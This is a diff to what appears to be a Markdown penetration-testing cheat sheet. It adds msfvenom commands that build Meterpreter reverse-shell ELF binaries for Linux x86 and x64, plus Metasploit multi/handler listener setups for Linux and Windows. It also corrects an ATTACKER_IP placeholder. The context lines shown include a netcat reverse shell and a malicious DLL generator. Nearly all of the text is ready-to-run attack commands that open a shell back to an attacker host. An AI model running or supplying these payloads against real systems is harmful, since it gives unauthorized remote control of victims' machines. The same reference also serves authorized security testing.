@@ -16,12 +16,33 @@ Payloads naming convention : \[OS\]/\[arch\]/\[payload\]
 
 ## Linux Reverse Shell
 
+### Msfvenom Payloads
+
 
  > 
- > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
+ > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
  > Generate a Linux reverse shell.
 
+ > 
+ > **<font color=red>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f elf ></font> reverse.elf**</br>
+ > Generate a Meterpreter Reverse Shell for Linux x86.
+ > 
+ > **<font color=red>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f elf ></font> reverse.elf**</br>
+ > Generate a Meterpreter Reverse Shell for Linux x64.
+
+### Metasploit Handler
+
+
+ > 
+ > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
+ > 
+ > \*\*<font color=red>set payload linux/x86/meterpreter/reverse_tcp</font> \*\*</br>
+ > **<font color=red>exploit</font>**</br>
+ > Handler for linux (efl) reverse shell.
+
 ## Windows Reverse Shell
+
+### Msfvenom Payloads
 
 
  > 
@@ -36,6 +57,16 @@ Payloads naming convention : \[OS\]/\[arch\]/\[payload\]
  > 
  > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> msfvenom_revshell<font color=red>.dll</font>**</br>
  > Generate a malicious DLL (meterpreter reverse shell).
+
+### Metasploit Handler
+
+
+ > 
+ > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
+ > 
+ > \*\*<font color=red>set payload windows/x64/meterpreter/reverse_tcp</font> \*\*</br>
+ > **<font color=red>exploit</font>**</br>
+ > Handler for Windows Meterpreter.
 
 ## Windows Shellcode (Buffer Overflow)
 
